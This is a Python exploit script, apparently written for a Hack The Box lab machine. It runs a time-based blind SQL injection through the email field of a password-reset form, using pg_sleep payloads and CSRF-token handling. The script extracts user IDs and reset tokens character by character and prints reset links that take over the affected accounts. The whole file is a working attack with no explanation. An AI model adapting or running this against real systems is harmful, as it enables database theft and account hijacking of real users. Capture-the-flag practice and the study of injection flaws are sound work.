import requests
import time
import re
import urllib3
urllib3.disable_warnings()

TARGET = "https://royalflush.htb"
DELAY = 3
THRESHOLD = 2.5
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

session = requests.Session()

def get_csrf_token():
    r = session.get(TARGET + "/forgot", verify=False)
    match = re.search(r'name="csrf_token" value\s*=\s*"([^"]+)"', r.text)
    if match:
        return match.group(1)
    return None

def oracle(condition):
    csrf = get_csrf_token()
    payload = f"' OR (SELECT CASE WHEN ({condition}) THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END) IS NULL--"
    data = {"email": payload, "csrf_token": csrf}
    headers = {"Referer": TARGET + "/forgot"}
    start = time.time()
    session.post(TARGET + "/forgot", data=data, headers=headers, verify=False, allow_redirects=False)
    return (time.time() - start) > THRESHOLD

print("Starting exploit")
print("Target: " + TARGET)
print("Dumping forgot table\n")

print("Counting rows in forgot table")
row_count = 0
for count in range(0, 100):
    if oracle(f"(SELECT COUNT(*) FROM forgot) = {count}"):
        row_count = count
        print(f"Row count: {row_count}")
        break

if row_count == 0:
    print("The forgot table is empty, create a password reset for an existing user such as lbrown@hotmail.com")
    exit()

print(f"\nFound {row_count} rows, extracting...\n")

# dump each row
for row in range(row_count):
    print(f"--- row {row + 1} ---")
    
    # extract user_id
    print("Extracting user ID")
    user_id = 0
    for val in range(1, 1000):
        if oracle(f"(SELECT user_id FROM forgot LIMIT 1 OFFSET {row}) = {val}"):
            user_id = val
            print(f"user_id: {user_id}")
            break
    
    print("Extracting token length")
    token_len = 0
    for length in range(1, 100):
        if oracle(f"LENGTH((SELECT token FROM forgot LIMIT 1 OFFSET {row})) = {length}"):
            token_len = length
            print(f"token length: {token_len}")
            break
    
    # extract token char by char
    print("Extracting token: ", end="", flush=True)
    token = ""
    for pos in range(1, token_len + 1):
        for char in CHARSET:
            if oracle(f"SUBSTRING((SELECT token FROM forgot LIMIT 1 OFFSET {row}), {pos}, 1) = '{char}'"):
                token += char
                print(char, end="", flush=True)
                break
    print()
    
    print(f"\nRow {row + 1}: user_id={user_id}, token={token}")
    print(f"Reset link: {TARGET}/reset?token={token}\n")

print("\nDump complete")